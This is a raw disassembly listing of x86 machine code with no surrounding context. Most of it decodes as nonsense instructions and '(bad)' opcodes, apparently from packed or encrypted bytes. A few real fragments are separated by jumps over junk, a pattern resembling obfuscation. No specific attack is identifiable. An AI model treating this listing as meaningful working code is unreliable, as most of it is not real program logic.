  418f5f:	xor    al,dh
  418f61:	adc    ax,0xa3ff
  418f65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f66:	es jp  0x418f33
  418f69:	rcl    edi,cl
  418f6b:	mov    edi,0x72130d3f
  418f70:	mov    esi,0x7e4b1986
  418f75:	cld    
  418f76:	pusha  
  418f77:	sub    BYTE PTR [edi-0x4f8bd544],cl
  418f7d:	jmp    0xeb8e9e8
  418f82:	mov    al,0x63
  418f84:	fsub   QWORD PTR [edi]
  418f86:	jbe    0x418f92
  418f88:	push   ds
  418f89:	xor    al,0x19
  418f8b:	lds    edi,FWORD PTR [eax]
  418f8d:	mov    ebp,?
  418f8f:	adc    ecx,esi
  418f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f92:	xlat   BYTE PTR ds:[ebx]
  418f93:	cmp    BYTE PTR [bx+di+0x4c06],bh
  418f98:	jge    0x418fb9
  418f9a:	inc    DWORD PTR ds:0xd30d695d
  418fa0:	mov    bl,bh
  418fa2:	inc    esp
  418fa3:	push   ebp
  418fa4:	cmp    esp,DWORD PTR [eax-0x261da94c]
  418faa:	sub    al,0x5f
  418fac:	rol    DWORD PTR [edi],cl
  418fae:	or     eax,0x881e1c05
  418fb3:	into   
  418fb4:	dec    esi
  418fb5:	jbe    0x418f59
  418fb7:	jno    0x419007
  418fb9:	adc    eax,0x462c1dbf
  418fbe:	pop    eax
  418fbf:	pop    esp
  418fc0:	leave  
  418fc1:	mov    eax,0xab191b33
  418fc6:	and    bl,BYTE PTR [edx+ebp*4-0x7492d248]
  418fcd:	push   ebp
  418fce:	or     cl,ch
  418fd0:	retf   0x0
  418fd3:	add    BYTE PTR [ebp-0x21],cl
  418fd6:	or     DWORD PTR [edx-0x100165],ebp
  418fdc:	test   al,0x55
  418fde:	ret    
  418fdf:	dec    esi
  418fe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fe1:	int3   
  418fe2:	imul   ebx,DWORD PTR [edi+0x11e55],0xffffffb2
  418fe9:	add    BYTE PTR [eax],al
  418feb:	add    BYTE PTR [edx-0x11],dh
  418fee:	ror    DWORD PTR cs:[esi+0x1bf8ca62],1
  418ff5:	xchg   DWORD PTR [eax+edx*1+0x5a],edi
  418ff9:	call   0x44d7343d
  418ffe:	mov    dl,0xbc
  419000:	out    0x16,eax
  419002:	scas   al,BYTE PTR es:[edi]
  419003:	xchg   esi,eax
  419004:	or     ebx,DWORD PTR [eax+0x6e7193bb]
  41900a:	int    0x99
  41900c:	cmp    eax,0x2ab4db9a
  419011:	test   bl,cl
  419013:	cmp    bl,BYTE PTR [esp+esi*2+0x27423489]
  41901a:	in     al,0x38
  41901c:	loopne 0x418feb
  41901e:	mov    bl,0x2e
  419020:	sbb    edi,DWORD PTR [edi+0x14089eb4]
  419026:	pop    edi
  419027:	clc    
  419028:	shl    DWORD PTR [esi+0x19],cl
  41902b:	dec    DWORD PTR [edi+edi*8-0x2a26cfd4]
  419032:	into   
  419033:	sub    eax,edx
  419035:	nop
  419036:	sahf   
  419037:	jbe    0x41903c
  419039:	jnp    0x419074
  41903b:	pop    ebx
  41903c:	sbb    eax,0xa2890681
  419041:	scas   al,BYTE PTR es:[edi]
  419042:	les    ebp,FWORD PTR [ebp-0x2d]
  419045:	shl    esp,cl
  419047:	pop    eax
  419048:	add    al,0xe2
  41904a:	repz and al,0x81
  41904d:	adc    BYTE PTR [ebx],cl
  41904f:	jb     0x418fdf
  419051:	mov    esi,0x71899a40
  419056:	or     esi,esi
  419058:	test   DWORD PTR [esp+ebx*4],0x29dfb148
  41905f:	adc    eax,0x504ce8f3
  419064:	sub    al,0xb0
  419066:	pop    ecx
  419067:	push   0xd2987eb
  41906c:	cmp    ebp,edi
  41906e:	push   ebp
  41906f:	popf   
  419070:	mov    eax,0x9e9f57ee
  419075:	mov    ch,0x57
  419077:	aaa    
  419078:	mov    WORD PTR [esi+0x333736eb],ds
  41907e:	cs inc ebx
  419080:	lods   al,BYTE PTR ds:[esi]
  419081:	inc    edx
  419082:	xor    eax,0x61408713
  419087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419088:	inc    esp
  419089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41908a:	jbe    0x4190a2
  41908c:	mul    DWORD PTR [ecx-0x66]
  41908f:	out    dx,eax
  419090:	mov    esi,0xe928278e
  419095:	das    
  419096:	in     eax,dx
  419097:	lea    edi,[edi]
  419099:	pop    esp
  41909a:	mov    dl,0x27
  41909c:	adc    al,BYTE PTR [ebp-0x7f]
  41909f:	icebp  
  4190a0:	push   edx
  4190a1:	(bad)  
  4190a3:	inc    DWORD PTR [ecx+0x67bde1]
  4190a9:	add    cl,ch
  4190ab:	retf   0x0
  4190ae:	add    BYTE PTR [eax-0x7b],ah
  4190b1:	lock test ch,dh
  4190b4:	cmc    
  4190b5:	je     0x41909c
  4190b7:	add    DWORD PTR [ebp-0x7e],ecx
  4190ba:	int    0x7
  4190bc:	in     eax,0x7b
  4190be:	or     eax,0x11f07
  4190c3:	mov    dl,0x0
  4190c5:	add    BYTE PTR [eax],al
  4190c7:	jbe    0x419095
  4190c9:	(bad)  
  4190ca:	lods   eax,DWORD PTR cs:[esi]
  4190cc:	adc    ecx,ecx
  4190ce:	mov    edx,0x9d859e9f
  4190d3:	ret    
  4190d4:	bound  esi,QWORD PTR [esi-0xc]
  4190d7:	or     ecx,DWORD PTR [edx]
  4190d9:	(bad)  
  4190da:	(bad)  
  4190db:	ficom  WORD PTR [edx-0x6aa7452b]
  4190e1:	jecxz  0x4190a6
  4190e3:	(bad)  
  4190e4:	fld    TBYTE PTR [esp+eax*8]
  4190e7:	cli    
  4190e8:	xor    BYTE PTR [eax+0x23],al
  4190eb:	mov    ah,0xf8
  4190ed:	inc    esi
  4190ee:	xchg   edx,eax
  4190ef:	xchg   esi,eax
  4190f0:	aam    0x19
  4190f2:	sbb    BYTE PTR [ebx],dh
  4190f4:	retf   
  4190f5:	retf   0xc8eb
  4190f8:	in     al,0xe3
  4190fa:	neg    DWORD PTR [edi+0x4c75d83a]
  419100:	fs jns 0x419124
  419103:	cld    
  419104:	mov    al,ds:0x4e3f82d
  419109:	pop    eax
  41910a:	rcr    al,1
  41910c:	pop    ecx
  41910d:	mov    ds:0x73a20601,eax
  419112:	dec    ebx
  419113:	in     eax,dx
  419114:	stc    
  419115:	data16 add bh,BYTE PTR [ebx-0x6]
  419119:	and    esp,ebp
  41911b:	mov    edi,0x700433d7
  419120:	pop    ebp
  419121:	mov    DWORD PTR [ebp+0x7],ebp
  419124:	dec    esp
  419125:	ja     0x41914b
  419127:	xor    eax,0x17f27e5
  41912c:	push   ebp
  41912d:	sbb    ecx,DWORD PTR [ecx+0x2c]
  419130:	xchg   edi,eax
  419131:	jle    0x4190e0
  419133:	mov    eax,ds:0xe515dec4
  419138:	cmp    al,0x83
  41913a:	mov    ebp,cs
  41913c:	pop    edx
  41913d:	and    al,0x6f
  41913f:	rcl    esi,cl
  419141:	cli    
  419142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419143:	xchg   ecx,eax
  419144:	sbb    cl,BYTE PTR [edx+0x1]
  419147:	mov    fs,WORD PTR [ebx]
  419149:	jne    0x4191bb
  41914b:	adc    al,BYTE PTR gs:[bx+si+0x32]
  419150:	xchg   edx,eax
  419151:	jmp    0x41912f
  419153:	xor    ebx,DWORD PTR [edi-0x2]
  419156:	xchg   esp,eax
  419157:	sub    DWORD PTR [edx+ebp*8],esi
  41915a:	xor    BYTE PTR [ecx],0x49
  41915d:	xor    eax,0x16762b87
  419162:	jno    0x41914b
  419164:	inc    ecx
  419165:	mov    cl,0xd0
  419167:	inc    ebp
  419168:	xchg   esp,eax
  419169:	jmp    0x6b6a4848
  41916e:	in     eax,dx
  41916f:	icebp  
  419170:	inc    ebp
  419171:	cmp    BYTE PTR [esi+ebp*4],0x6b
  419175:	scas   eax,DWORD PTR es:[edi]
  419176:	fidiv  WORD PTR [ebx+0x5fc18165]
  41917c:	or     DWORD PTR [eax],eax
  41917e:	add    cl,dl
  419180:	jmp    0x425c6e
  419185:	add    BYTE PTR [eax],bl
  419187:	inc    ebx
  419188:	push   esi
  419189:	sbb    bl,BYTE PTR [edi+0x1f]
  41918c:	pop    esp
  41918d:	inc    ebx
  41918e:	and    eax,0xac4e5c60
  419193:	push   ebp
  419194:	outs   dx,DWORD PTR ds:[esi]
  419195:	jo     0x419150
  419197:	pop    ds
  419198:	add    DWORD PTR [eax],eax
  41919a:	mov    dl,0x0
  41919c:	add    BYTE PTR [eax],al
  41919e:	inc    eax
  41919f:	mov    ecx,0x1fd6dee3
  4191a4:	into   
  4191a5:	jmp    0x4191bb
  4191a7:	dec    ecx
  4191a8:	(bad)  
  4191a9:	jmp    0x85494580
  4191ae:	(bad)  
  4191af:	pusha  
  4191b0:	cs jg  0x41917b
  4191b3:	scas   eax,DWORD PTR es:[edi]
  4191b4:	and    BYTE PTR ds:0x39e6359c,ah
  4191ba:	in     al,dx
  4191bb:	aad    0x4a
  4191bd:	dec    esp
  4191be:	and    BYTE PTR [esi],ah
  4191c0:	outs   dx,DWORD PTR ds:[esi]
  4191c1:	test   eax,0x5283ace5
  4191c6:	adc    esi,DWORD PTR [ecx]
  4191c8:	cmc    
  4191c9:	jle    0x4191b7
  4191cb:	add    BYTE PTR [edi+0x13c8ef4],dl
  4191d1:	jmp    0x419167
  4191d3:	push   esp
  4191d4:	push   cs
  4191d5:	xor    dh,al
  4191d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191d8:	lea    ebp,[ebx+0x3401fb9d]
  4191de:	rcl    DWORD PTR [ebp+eiz*4-0x5413a857],cl
  4191e5:	or     eax,0x5e1cf7e4
  4191ea:	cli    
  4191eb:	push   edi
  4191ec:	stc    
  4191ed:	(bad)  
  4191ee:	outs   dx,BYTE PTR ds:[esi]
  4191ef:	fimul  WORD PTR [ebp+0x24]
  4191f2:	push   es
  4191f3:	outs   dx,DWORD PTR ds:[esi]
  4191f4:	pop    edi
  4191f5:	xchg   ecx,eax
  4191f6:	mov    eax,0x4a182aa0
  4191fb:	and    eax,0x95f57ac2
  419200:	gs push ecx
  419202:	pop    ebp
  419203:	out    0xa7,eax
  419205:	lods   eax,DWORD PTR ds:[esi]
  419206:	dec    ebp
  419207:	das    
  419208:	jg     0x419199
  41920a:	shl    cl,1
  41920c:	add    bl,0x19
  41920f:	(bad)  
  419210:	dec    edi
  419211:	in     al,0xba
  419213:	push   0x3cd89ec1
  419218:	fnstcw WORD PTR [edi+edi*2+0xd]
  41921c:	xchg   BYTE PTR [ebx+0x5593eaa2],bh
  419222:	rol    BYTE PTR [esi],cl
  419224:	call   0xa8b4:0xd44f2a6d
  41922b:	mov    ebp,0x8396da13
  419230:	call   0xd1c3:0x6affbfb8
  419237:	imul   eax,DWORD PTR [eax],0x2e5b8352
  41923d:	mov    ah,BYTE PTR [ebx]
  41923f:	xchg   edx,eax
  419240:	inc    ebp
  419241:	xor    bh,BYTE PTR [ebx-0x40]
  419244:	jmp    0x419215
  419246:	mov    al,0x87
  419248:	(bad)  [ebp+0x49519691]
  41924e:	arpl   WORD PTR [edx-0x75],cx
  419251:	mov    WORD PTR [ecx],ss
  419253:	or     al,0xd9
  419255:	(bad)  
  419256:	(bad)  
  419257:	jmp    0x419326
  41925c:	mov    cs,ebp
  41925e:	pop    ebx
  41925f:	sbb    BYTE PTR [ebx-0x62],bl
  419262:	iret   
  419263:	(bad)  
  419265:	and    esp,ebx
  419267:	jo     0x419203
  419269:	out    0x44,eax
  41926b:	lahf   
  41926c:	imul   esp,DWORD PTR [eax],0x1
  41926f:	add    BYTE PTR [edx-0x74000000],dh
  419275:	jno    0x4191fc
  419277:	xor    BYTE PTR [ebp+0x78],dl
  41927a:	jle    0x4192ac
  41927c:	xchg   ebp,eax
  41927d:	push   edx
  41927e:	sub    ebx,DWORD PTR [eax+0x4eba462d]
  419284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419285:	push   edx
  419286:	pusha  
  419287:	popf   
  419288:	xchg   DWORD PTR [edi],esi
  41928a:	xchg   edx,eax
  41928b:	stc    
  41928c:	pushf  
  41928d:	xor    BYTE PTR [eiz*4-0x1086663],cl
  419294:	je     0x419221
  419296:	shr    DWORD PTR [ecx+0xadcfcb],cl
  41929c:	add    ch,BYTE PTR [edx+0x2a68bcdb]
  4192a2:	sbb    DWORD PTR [ecx],0x7c
  4192a5:	pop    esi
  4192a6:	pusha  
  4192a7:	mov    edi,0x8d8460a8
  4192ac:	jmp    0x4192af
  4192ae:	sbb    al,ch
  4192b0:	pusha  
  4192b1:	jmp    FWORD PTR [edi+ecx*8]
  4192b4:	jmp    0xd35c:0xbb1ebf64
  4192bb:	and    ecx,0x1f
  4192be:	and    eax,0x4791fd10
  4192c3:	mov    eax,0x7c256279
  4192c8:	push   edi
  4192c9:	pop    ebp
  4192ca:	fidiv  WORD PTR [edi+ebp*2+0x6f]
  4192ce:	push   esp
  4192cf:	arpl   WORD PTR [ebx-0x59],di
  4192d2:	push   es
  4192d3:	(bad)  
  4192d4:	and    al,0xc5
  4192d6:	sub    al,0x60
  4192d8:	stc    
  4192d9:	inc    edi
  4192da:	fist   DWORD PTR [ecx+0x38]
  4192dd:	push   eax
  4192de:	mov    bl,0xb7
  4192e0:	xchg   edx,eax
  4192e1:	inc    ebx
  4192e2:	cmp    eax,0x8f135f42
  4192e7:	or     BYTE PTR [eax+0x5f],0x1f
  4192eb:	pop    eax
  4192ec:	jp     0x41933a
  4192ee:	aaa    
  4192ef:	xchg   ecx,eax
  4192f0:	push   esp
  4192f1:	popa   
  4192f2:	add    DWORD PTR [edx+0xf3c4d3c],eax
  4192f8:	out    dx,eax
  4192f9:	cmc    
  4192fa:	in     al,dx
  4192fb:	pop    ecx
  4192fc:	inc    ecx
  4192fd:	push   edx
  4192fe:	xchg   ecx,eax
  4192ff:	mov    ds:0xb0f0f618,al
  419304:	stc    
  419305:	push   ss
  419306:	mov    edi,0x1e213587
  41930b:	test   al,0x7b
  41930e:	cmp    eax,0xe214a54a
  419313:	lahf   
  419314:	mov    esp,0x20f2378b
  419319:	loop   0x41931b
  41931b:	imul   esi,DWORD PTR [edi+0x2e601496],0x71bacffb
  419325:	mov    cl,BYTE PTR [ebp-0x22b7f77c]
  41932b:	(bad)  
  41932c:	(bad)  
  41932d:	jmp    0x4193fc
  419332:	sub    DWORD PTR [eax],edx
  419334:	mov    ebx,ebx
  419336:	mov    ebx,0xd3f279db
  41933b:	das    
  41933c:	fcmovnb st,st(3)
  41933e:	cmp    BYTE PTR [eax+0x211dc439],0x1
  419345:	add    BYTE PTR [edx-0x5c000000],dh
  41934b:	retf   
  41934c:	jnp    0x41934c
  41934e:	es sub eax,0x79c149a4
  419354:	das    
  419355:	in     al,0xce
  419357:	loopne 0x41930f
  419359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41935a:	(bad)  
  41935b:	je     0x419364
  41935d:	push   ecx
  41935e:	jns    0x4192ec
  419360:	lahf   
  419361:	pushf  
  419362:	popa   
  419363:	inc    edx
  419364:	pop    ds
  419365:	jg     0x419315
  419367:	pop    ss
  419368:	cmp    BYTE PTR [esi+ebx*2+0x755dd995],ah
  41936f:	and    al,0x3e
  419371:	inc    ecx
  419372:	jecxz  0x419399
  419374:	xor    BYTE PTR [ebx+ebx*8],ch
  419377:	push   0xfc9a2d60
  41937c:	retf   0xa549
  41937f:	pop    es
  419380:	call   0x1d3ae58f
  419385:	fisub  DWORD PTR [edi-0x3e118df5]
  41938b:	ins    BYTE PTR es:[edi],dx
  41938c:	pop    edi
  41938d:	les    ecx,FWORD PTR [edi+0x4767bb4e]
  419393:	add    ecx,DWORD PTR [esi+0x78]
  419396:	and    BYTE PTR ds:0xef44ef78,ch
  41939c:	mov    cs,WORD PTR ds:0x292f2253
  4193a2:	push   edi
  4193a3:	cdq    
  4193a4:	or     eax,0xc9e60ff6
  4193a9:	sub    eax,0xba7e1cb8
  4193ae:	das    
  4193af:	jmp    0x419419
  4193b1:	mov    al,0xd4
  4193b3:	nop
  4193b4:	fadd   st,st(4)
  4193b6:	cmp    DWORD PTR [esi+edi*1+0x1731023d],edi
  4193bd:	ins    DWORD PTR es:[edi],dx
  4193be:	es jne 0x4193b6
  4193c1:	fcomp  QWORD PTR [ecx-0x5d]
  4193c4:	lds    edx,FWORD PTR [edx-0x7fd97a26]
  4193ca:	or     eax,0xc02c9efd
  4193cf:	push   0xffffffdf
  4193d1:	je     0x419444
  4193d3:	pop    edx
  4193d4:	cmp    BYTE PTR [eax+0x40b56e36],dl
  4193da:	cwde   
  4193db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193dc:	jle    0x41938e
  4193de:	inc    ebx
  4193df:	mov    ?,WORD PTR [eax-0x392b3826]
  4193e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193e6:	pop    ebx
  4193e7:	cld    
  4193e8:	mov    esp,0xc5cd8ae7
  4193ed:	mov    bl,0x82
  4193ef:	cwde   
  4193f0:	jbe    0x41942c
  4193f2:	mov    edi,0xf0cf09c2
  4193f7:	jnp    0x4193c2
  4193f9:	jb     0x419432
  4193fb:	ror    BYTE PTR [ebx+0x8be04d],1
  419401:	jmp    0x4194d0
  419406:	(bad)  
  419407:	pop    ebx
  419408:	test   al,0x16
  41940a:	mov    esp,0xeedbfff7
  41940f:	daa    
  419410:	dec    eax
  419411:	addr16 leave 
  419413:	pop    esp
  419414:	aam    0xde
  419416:	iret   
  419417:	and    DWORD PTR [ecx],eax
  419419:	add    BYTE PTR [edx+0x5000000],dh
  41941f:	xor    eax,0xcd312168
  419424:	rol    BYTE PTR [edx-0x4],0xfa
  419428:	test   al,0xb7
  41942a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41942b:	sbb    DWORD PTR [ecx],eax
  41942d:	jmp    0x4194a6
  41942f:	not    DWORD PTR [ecx+0x1c8d35ab]
  419435:	inc    esp
  419436:	xor    BYTE PTR [ebx-0x63],cl
  419439:	adc    dl,BYTE PTR ds:[edi]
  41943c:	pop    ecx
  41943d:	mov    ah,0xe4
  41943f:	aas    
  419440:	cdq    
  419441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419442:	cwde   
  419443:	pop    edx
  419444:	jmp    0x41948e
  419446:	xlat   BYTE PTR ds:[ebx]
  419447:	add    eax,0xae101725
  41944c:	inc    ebp
  41944d:	dec    eax
  41944e:	and    dl,0xc5
  419451:	lea    ebp,[ebx+0xa4292a2]
  419457:	jne    0x419460
  419459:	push   esi
  41945a:	adc    bl,0x1d
  41945d:	sub    esi,DWORD PTR [ebx-0x14]
  419460:	jle    0x4194a3
  419462:	cdq    
  419463:	or     cl,ch
  419465:	dec    edx
  419466:	test   al,0xab
  419468:	add    DWORD PTR [eax],esi
  41946a:	mov    al,0x7e
  41946c:	pop    esp
  41946d:	mov    DWORD PTR [edx],esi
  41946f:	push   ebp
  419470:	cdq    
  419471:	jno    0x41941d
  419473:	xchg   ebp,eax
  419474:	dec    edi
  419475:	loop   0x4194cb
  419477:	test   DWORD PTR ds:0x5b989869,edx
  41947d:	lods   eax,DWORD PTR ds:[esi]
  41947e:	stc    
  41947f:	sub    ebx,DWORD PTR [ebx]
  419481:	aas    
  419482:	cmc    
  419483:	xor    ecx,esi
  419485:	jmp    0x1bf4:0x17bc562a
  41948c:	test   eax,0xaf951156
  419491:	enter  0x46b,0xe9
  419495:	dec    ecx
  419496:	retf   0x5d5
  419499:	daa    
  41949a:	les    ecx,FWORD PTR [ebx-0x7aba5cf9]
  4194a0:	loope  0x4194e9
  4194a2:	fdivr  DWORD PTR [edx]
  4194a4:	int    0x6a
  4194a6:	jl     0x41950c
  4194a8:	fnstsw WORD PTR [ecx-0x233da643]
  4194ae:	ja     0x4194b3
  4194b0:	jbe    0x41950d
  4194b2:	inc    eax
  4194b3:	inc    edi
  4194b4:	imul   edi,ecx,0x1f
  4194b7:	dec    edi
  4194b8:	lea    edx,[ecx]
  4194ba:	and    dh,al
  4194bc:	jge    0x419495
  4194be:	mov    bl,0x50
  4194c0:	in     eax,dx
  4194c1:	dec    eax
  4194c2:	and    eax,0x2a7d0e13
  4194c7:	xlat   BYTE PTR ds:[ebx]
  4194c8:	push   edx
  4194c9:	xchg   ah,dh
  4194cb:	call   0x8067cd7d
  4194d0:	or     ecx,0x2ac1
  4194d6:	add    eax,ecx
  4194d8:	mov    ecx,DWORD PTR [ebp-0x24]
  4194db:	sub    eax,ecx
  4194dd:	mov    ecx,DWORD PTR [ebp-0x28]
  4194e0:	lea    eax,[eax+ecx*1-0x5a37]
  4194e7:	jmp    0x4195b6
  4194ec:	mov    BYTE PTR [edx-0x5c547d7d],ah
  4194f2:	mov    DWORD PTR [edx-0x21c7a472],ebp
  4194f8:	pop    edx
  4194f9:	xchg   esi,eax
  4194fa:	or     dh,BYTE PTR [ebx]
  4194fc:	and    DWORD PTR [edx],0xb20001
  419502:	add    BYTE PTR [eax],al
  419504:	sar    esp,1
  419506:	add    DWORD PTR ds:0x1a6b3ab0,0x9bc9714a
  419510:	fldenv [ebx]
  419512:	enter  0xed1,0x58
  419516:	mov    esi,0xfe0faa28
  41951b:	(bad)  
  41951c:	sbb    eax,0x606dbed0
  419521:	mov    al,0xb2
  419523:	js     0x4194be
  419525:	sub    al,0x29
  419528:	retf   0x5b4e
  41952b:	jl     0x419574
  41952d:	xor    al,0x95
  41952f:	sbb    BYTE PTR [edx-0x48f6c5dc],ah
  419535:	aaa    
  419536:	pop    ebx
  419537:	xor    cl,BYTE PTR [ecx+0x94a495a]
  41953d:	cdq    
  41953e:	test   BYTE PTR [edi-0x3b],bh
  419541:	add    BYTE PTR [ecx],ch
  419543:	in     eax,0x37
  419545:	sbb    esp,ebx
  419547:	pop    eax
  419548:	stos   DWORD PTR es:[edi],eax
  419549:	xor    DWORD PTR [edx+0x2ad1b52d],0xbe728dde
  419553:	cmp    BYTE PTR [edx-0xc],bl
  419556:	mov    bh,0x0
  419558:	add    edx,edx
  41955a:	add    ch,ah
  41955c:	call   0xbd788195
  419561:	fiadd  WORD PTR [edi+eax*1+0x384adcf5]
  419568:	add    al,0x54
  41956a:	fimul  DWORD PTR [ebp-0x7fe32499]
  419570:	sti    
  419571:	frstor [ebp-0x452e60f8]
  419577:	push   es
  419578:	cmp    al,0x8
  41957a:	daa    
  41957b:	pusha  
  41957c:	shr    BYTE PTR [esi+0x17e3e21e],1
  419582:	imul   ecx,DWORD PTR [eax],0xd5768391
  419588:	jecxz  0x419547
  41958a:	mov    eax,0x2ef9e0c1
  41958f:	jecxz  0x419596
  419591:	pop    DWORD PTR [esi+0x58]
  419594:	hlt    
  419595:	fld    TBYTE PTR [edx]
  419597:	xor    eax,0xad240d65
  41959c:	ins    WORD PTR es:[edi],dx
  41959e:	adc    eax,0xd4f4fdbe
  4195a3:	cmp    eax,0x39c74a84
  4195a8:	jg     0x41953d
  4195aa:	sbb    eax,0xac240ed3
  4195af:	(bad)  
  4195b0:	out    0x5f,eax
  4195b2:	dec    esi
  4195b3:	ds into 
  4195b5:	pushf  
  4195b6:	mov    ecx,DWORD PTR ds:0x433238
  4195bc:	add    DWORD PTR [eax],ecx
  4195be:	mov    eax,DWORD PTR [ebp-0x68]
  4195c1:	mov    ecx,DWORD PTR [ebp-0x64]
  4195c4:	mov    edx,DWORD PTR [ebp-0x70]
  4195c7:	mov    esi,DWORD PTR [ebp-0x6c]
  4195ca:	jmp    0x419699
  4195cf:	cmp    ebx,DWORD PTR [ecx+0x4d]
  4195d2:	imul   ebp,DWORD PTR [edi+0x7f],0x3f
  4195d6:	pop    ecx
  4195d7:	js     0x419651
  4195d9:	pop    esp
  4195da:	pop    edi
  4195db:	push   ebp
  4195dc:	cdq    
  4195dd:	dec    esi
  4195de:	mov    ?,WORD PTR [ebx]
  4195e0:	and    eax,DWORD PTR [ecx]
  4195e2:	add    BYTE PTR [edx-0xa000000],dh
  4195e8:	loopne 0x4195f8
  4195ea:	push   eax
  4195eb:	popa   
  4195ec:	push   ebp
  4195ed:	hlt    
  4195ee:	sub    al,0x3
  4195f0:	sbb    DWORD PTR cs:[ebp-0x6265e7c2],0x1bbc01b6
  4195fb:	mov    ebp,0x8d39af5e
  419600:	pop    ecx
  419601:	jne    0x41966f
  419603:	dec    ecx
  419604:	push   esp
  419605:	jb     0x4195f8
  419607:	pop    ecx
  419608:	ret    0x4750
  41960b:	bound  esp,QWORD PTR [ebp-0x65]
  41960e:	cld    
  41960f:	sbb    eax,0x2c19539d
  419614:	mov    eax,0xe187e133
  419619:	mov    ah,0x30
  41961b:	(bad)  
  41961c:	icebp  
  41961d:	xchg   ecx,eax
  41961e:	aas    
  41961f:	mov    eax,ds:0x757d41a2
  419624:	add    eax,0x65d4f04d
  419629:	clc    
  41962a:	fisubr DWORD PTR [edx+eiz*1-0x4a]
  41962e:	push   0xffffff9b
  419630:	and    DWORD PTR [ecx-0x7b],0xffffffe7
  419634:	test   BYTE PTR [ecx],dl
  419636:	fstp   QWORD PTR [edi+0x3f56774a]
  41963c:	(bad)  
  41963d:	pop    esp
  41963e:	and    BYTE PTR [ecx],bh
  419640:	inc    edx
  419641:	cmp    al,0xcb
  419643:	and    ah,ch
  419645:	mov    ds:0x1f100cbc,eax
  41964a:	xor    BYTE PTR ds:0x526b0e6f,dl
  419650:	inc    ebp
  419651:	ds sti 
  419653:	imul   esi,edx,0xa4e8e2db
  419659:	call   0x26127cd6
  41965e:	dec    ebp
  41965f:	cld    
  419660:	push   esp
  419661:	push   es
  419662:	mov    ds:0x351df3b6,eax
  419667:	lds    ebp,FWORD PTR [edi]
  419669:	sti    
  41966a:	hlt    
  41966b:	sub    edx,DWORD PTR [edx+0x54]
  41966e:	gs ret 0x5377
  419672:	dec    edi
  419673:	xchg   esp,eax
  419674:	mov    bh,BYTE PTR [ebp+0x232b7543]
  41967a:	out    dx,al
  41967b:	pushfw 
  41967d:	and    BYTE PTR [edx-0x2e],bl
  419680:	xor    dh,BYTE PTR [ebx-0x5db32edb]
  419686:	repz inc eax
  419688:	(bad)  
  419689:	jno    0x4196a1
  41968b:	es cwde 
  41968d:	dec    ecx
  41968e:	pop    edx
  41968f:	retf   0x4108
  419692:	cld    
  419693:	sub    ecx,ebp
  419695:	daa    
  419696:	pop    ebp
  419697:	stos   BYTE PTR es:[edi],al
  419698:	push   es
  419699:	xor    eax,0x7db9
  41969e:	xor    ecx,0x5c11
  4196a4:	sub    eax,edx
  4196a6:	mov    edx,DWORD PTR [ebp-0x78]
  4196a9:	sbb    ecx,esi
  4196ab:	mov    esi,DWORD PTR [ebp-0x74]
  4196ae:	or     eax,edx
  4196b0:	mov    edx,DWORD PTR ds:0x433238
  4196b6:	jmp    0x419785
  4196bb:	xlat   BYTE PTR ds:[ebx]
  4196bc:	ja     0x4196d7
  4196be:	xchg   BYTE PTR [ecx+0x4077dfee],bh
  4196c4:	push   esi
  4196c5:	call   0xe53f:0x50e7fd39
  4196cc:	and    eax,DWORD PTR [ecx]
  4196ce:	add    BYTE PTR [edx+0x74000000],dh
  4196d4:	in     eax,0x65
  4196d6:	inc    ebx
  4196d7:	mov    ah,0x39
  4196d9:	pusha  
  4196da:	xchg   ebp,eax
  4196db:	out    dx,eax
  4196dc:	xor    eax,0x8731a85a
  4196e1:	psubsw mm6,QWORD PTR [esi-0x65]
  4196e5:	lahf   
  4196e6:	hlt    
  4196e7:	aam    0x8a
  4196e9:	or     ebp,ebp
  4196eb:	mov    bh,BYTE PTR [ecx-0x63]
  4196ee:	adc    BYTE PTR [esi-0x7b],dl
  4196f1:	jne    0x419699
  4196f3:	adc    ebx,DWORD PTR [ecx+0x26]
  4196f6:	inc    eax
  4196f7:	fcmovb st,st(4)
  4196f9:	fwait
  4196fa:	mov    ds:0x18ec5747,eax
  4196ff:	jl     0x419731
  419701:	push   ss
  419702:	inc    ecx
  419703:	xor    bh,dl
  419705:	mov    al,ds:0x8abdc3bd
  41970a:	dec    esi
  41970b:	aas    
  41970c:	xor    bh,BYTE PTR [edx+0x78]
  41970f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419710:	repnz push 0x64eb5ec5
  419716:	adc    ch,BYTE PTR [edi]
  419718:	pop    ss
  419719:	mov    ds:0x7e866ff7,al
  41971e:	sub    DWORD PTR [ebp+0x2f],eax
  419721:	pop    es
  419722:	mov    BYTE PTR [ecx+0x78],cl
  419725:	pop    esi
  419726:	push   eax
  419727:	xor    BYTE PTR [eax-0x36],al
  41972a:	or     eax,0xa72e2409
  41972f:	aad    0xe4
  419731:	add    al,0xe7
  419733:	push   esp
  419734:	cli    
  419735:	mov    al,ds:0x5198b510
  41973a:	adc    eax,DWORD PTR [ecx]
  41973c:	stc    
  41973d:	or     dl,BYTE PTR [ecx+0x65474d96]
  419743:	xchg   ebp,eax
  419744:	add    bl,bl
  419746:	jb     0x419718
  419748:	std    
  419749:	and    al,0x38
  41974b:	jno    0x41977a
  41974d:	icebp  
  41974e:	xchg   esi,eax
  41974f:	dec    esi
  419750:	sub    BYTE PTR [ebx+eiz*4+0x5f33905c],cl
  419757:	xchg   bh,bh
  419759:	push   eax
  41975a:	fsub   QWORD PTR [eax-0x286ef7dd]
  419760:	mov    ecx,0x5571ce9d
  419765:	ins    DWORD PTR es:[edi],dx
  419766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419767:	mov    al,ds:0xfb7751c0
  41976c:	add    eax,0x947b102a
  419771:	inc    esp
  419772:	and    edi,DWORD PTR [edi-0x6ac6dac6]
  419778:	push   ds
  419779:	stc    
